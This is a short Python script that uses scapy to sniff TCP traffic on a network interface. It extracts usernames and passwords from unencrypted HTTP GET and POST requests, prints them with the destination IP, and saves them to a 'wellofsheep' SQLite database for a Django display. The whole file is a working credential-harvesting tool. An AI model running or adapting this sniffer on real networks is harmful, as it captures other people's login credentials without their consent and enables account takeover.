#!/usr/bin/env python

from scapy.all import *
import re
import sqlite3

def http_analyze(pcap):
    try:
        temp_load = pcap[TCP][Raw].load
    except:
        return 
   
    header_option = temp_load.split('\r\n')[0]
    if re.match('^GET', header_option):
        option = 'GET'
        content = header_option.split('?')[-1].split(' ')[0]
    elif re.match('^POST', header_option):
        option = 'POST'
        content = temp_load.split('\r\n')[-1]
    else:
        return 

    try:
        data = dict(x.split('=') for x in content.split('&'))
    except:
        return 

    userid = passwd = 'not found'

    for key, value in data.items():
        if re.match('USERID|name|user', key, re.I):
            userid = value
        elif re.match('PASSWD|password|pass', key, re.I):
            passwd = value
    
    if userid != 'not found' and passwd != 'not found':
        print 'IP:{}:{} {}=> userid = {} & passwd = {}'.format(pcap[IP].dst, pcap[IP].dport, option, userid, passwd)
        conn = sqlite3.connect('../django_wellofsheep/db.sqlite3')
        cursor = conn.cursor()
        cursor.execute('insert into wellofsheep_sheeps_table (account, password, ip, option) values (?, ?, ?, ?)', (userid, passwd, pcap[IP].dst, option))
        cursor.close()
        conn.commit()
        conn.close()

def main():
    nic_id = 'eth0'
    filter_rule = 'tcp'
    prn_func = http_analyze
    sniff(iface = nic_id, filter = filter_rule, prn = prn_func, count = 0)

if __name__ == '__main__':
    main()
